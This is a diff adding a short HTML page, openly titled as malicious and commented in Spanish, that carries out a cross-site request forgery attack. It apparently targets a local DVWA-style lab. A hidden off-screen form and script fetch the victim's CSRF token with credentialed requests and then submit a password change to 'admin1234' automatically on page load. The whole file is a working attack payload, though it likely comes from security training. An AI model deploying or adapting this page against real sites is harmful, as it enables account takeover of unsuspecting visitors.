@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious para el Damnificado</title>
+    <style>
+        form {
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <form id="csrfForm" action="http://127.0.0.1:42001/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="admin1234">
+        <input type="hidden" name="password_conf" value="admin1234">
+        <input type="hidden" name="csrf_token" id="csrfToken" value="">
+    </form>
+
+    <script>
+        // Realizar una solicitud HTTP previa para obtener el token CSRF
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "http://127.0.0.1:42001/vulnerabilities/csrf/token_csrf", true);
+        xhr.withCredentials = true; // Habilitar credenciales de CORS
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                    // Capturar el token CSRF de la respuesta
+                    var csrfToken = xhr.responseText;
+                    // Agregar el token CSRF al formulario
+                    document.getElementById("csrfToken").value = csrfToken;
+                    // Enviar el formulario automáticamente
+                    document.getElementById("csrfForm").submit();
+                } else {
+                    console.error("Error al obtener el token CSRF:", xhr.status);
+                }
+            }
+        };
+        xhr.send();
+    </script>
+</body>
+</html>
